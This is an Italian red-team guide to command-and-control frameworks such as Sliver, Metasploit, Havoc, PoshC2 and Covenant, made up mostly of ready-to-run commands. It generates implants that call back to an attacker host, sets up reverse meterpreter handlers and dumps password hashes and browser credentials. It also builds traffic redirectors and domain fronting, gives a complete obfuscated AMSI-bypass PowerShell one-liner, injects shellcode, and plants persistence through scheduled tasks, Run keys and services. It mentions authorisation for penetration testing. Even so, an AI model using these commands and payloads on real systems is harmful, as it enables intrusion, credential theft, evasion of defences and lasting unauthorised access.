# Command and Control (C2)

## Scopo

Questa guida copre framework e tecniche di Command and Control utilizzati durante operazioni di red team e penetration test avanzati.

## Prerequisiti

- Server per hosting C2
- Conoscenza networking
- Framework C2 installato
- **Autorizzazione esplicita per testing**

---

## C2 Framework Overview

| Framework | Linguaggio | Focus |
|-----------|------------|-------|
| Cobalt Strike | Java | Enterprise, mature |
| Sliver | Go | Open source, modern |
| Havoc | C++/Python | Open source |
| Metasploit | Ruby | Versatile, well-known |
| Covenant | C# | .NET focused |
| PoshC2 | Python/PS | PowerShell centric |
| Empire | Python/PS | Post-exploitation |
| wsc2 | Python | WebSocket C2 |
| WMImplant | PowerShell | WMI-based C2 |
| DropboxC2 | Python | Dropbox as C2 channel |
| TrevorC2 | Python | Legitimate website cloning |
| Twittor | Python | Twitter as C2 channel |
| DNSCat2 | Ruby/C | DNS tunneling C2 |
| Socat | C | Multipurpose relay |

---

## Sliver

### Installazione

```bash
# Download
curl https://sliver.sh/install | sudo bash

# Start server
sliver-server

# O come service
systemctl start sliver
```

### Generazione Implant

```bash
# Beacon (async)
sliver > generate beacon --http ATTACKER_IP --save /tmp/beacon

# Session (sync)
sliver > generate --mtls ATTACKER_IP --save /tmp/session

# Specifico OS
sliver > generate beacon --http ATTACKER_IP --os windows --arch amd64
```

### Listeners

```bash
# HTTP listener
sliver > http

# HTTPS
sliver > https

# mTLS
sliver > mtls

# DNS
sliver > dns -d attacker.com
```

### Operazioni Base

```bash
# Lista sessioni
sliver > sessions

# Interagire
sliver > use SESSION_ID

# Comandi
sliver (SESSION) > whoami
sliver (SESSION) > pwd
sliver (SESSION) > ls
sliver (SESSION) > download /etc/passwd
sliver (SESSION) > upload shell.sh
sliver (SESSION) > shell
```

---

## Metasploit

### Handler

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 10.10.10.10
set LPORT 443
run
```

### Meterpreter Commands

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > shell
meterpreter > upload /local/file /remote/path
meterpreter > download /remote/file /local/path
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.10
meterpreter > run persistence -h
```

### Post-Exploitation Modules

```bash
# Enumerate
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_logged_on_users

# Credentials
run post/windows/gather/hashdump
run post/multi/gather/firefox_creds

# Pivot
run post/multi/manage/autoroute
```

---

## Havoc

### Setup

```bash
# Clone
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build
make ts-build
make client-build

# Start
./havoc server --profile profile.yaotl
./havoc client
```

### Listeners

```yaml
# profile.yaotl
Listeners:
  - Name: "HTTP"
    Protocol: "http"
    BindAddress: "0.0.0.0"
    BindPort: 8080
    Headers:
      - Server: Apache
```

---

## PoshC2

### Installazione

```bash
curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash

# Nuovo progetto
posh-project -n MyProject

# Start server
posh-server

# Client
posh
```

### Implants

```bash
# PowerShell
PoshC2 > create-implant -p Sharp

# Python
PoshC2 > create-implant -p Python
```

---

## Covenant

### Setup

```bash
# Docker
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
docker build -t covenant .
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant covenant

# Access
https://localhost:7443
```

### Grunts (Agents)

```
1. Listeners → Create HTTP/HTTPS
2. Launchers → PowerShell/Binary
3. Grunts → Active sessions
4. Tasks → Execute commands
```

---

## Infrastructure

### Redirectors

```bash
# Socat redirector
socat TCP-LISTEN:80,fork TCP:C2_SERVER:8080

# iptables
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination C2_IP:8080
iptables -t nat -A POSTROUTING -j MASQUERADE
```

### Domain Fronting

```
1. CDN (CloudFront, Azure CDN)
2. Traffico sembra verso CDN legittimo
3. Host header verso C2

# Cobalt Strike malleable profile
http-get {
    set uri "/api/v1";
    client {
        header "Host" "legitimate.cdn.com";
    }
}
```

### DNS over HTTPS

```bash
# C2 traffic via DoH
# Evade inspection rete
```

---

## Evasion

### AMSI Bypass (Windows)

```powershell
# Memory patching
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Process Injection

```bash
# Sliver
sliver > execute-shellcode PROCESS_NAME -i shellcode.bin

# Metasploit
meterpreter > run post/windows/manage/migrate
```

### Sleep/Jitter

```bash
# Sliver beacon
sliver > generate beacon --http C2 --seconds 60 --jitter 30

# Randomizza callback times
```

---

## Detection Evasion

### Traffic Blending

```
- Usa HTTPS porta 443
- Imita pattern traffico legittimo
- User-Agent realistici
- Certificate validi
```

### Malleable Profiles (Cobalt Strike)

```
http-get {
    set uri "/search";
    client {
        header "Accept" "text/html";
        metadata {
            base64url;
            parameter "q";
        }
    }
    server {
        output {
            print;
        }
    }
}
```

---

## Persistence

```bash
# Scheduled task
sliver > execute -- schtasks /create /tn "Update" /tr "C:\beacon.exe" /sc daily

# Registry
sliver > execute -- reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\beacon.exe

# Service
sliver > execute -- sc create MyService binPath= C:\beacon.exe
```

---

## Cleanup

```bash
# Rimuovi implant
sliver > sessions -K SESSION_ID

# Remove persistence
# Ripristina registry/scheduled tasks
# Rimuovi file dropper
```

---

## Best Practices

- **Authorization**: Scope chiaramente definito
- **Logging**: Log tutte le operazioni
- **Minimal footprint**: Solo azioni necessarie
- **Cleanup**: Rimuovi tutto post-engagement
- **OPSEC**: Evita detection

## Riferimenti

- [Sliver](https://github.com/BishopFox/sliver)
- [Havoc](https://github.com/HavocFramework/Havoc)
- [Metasploit](https://www.metasploit.com/)
- [C2 Matrix](https://www.thec2matrix.com/)
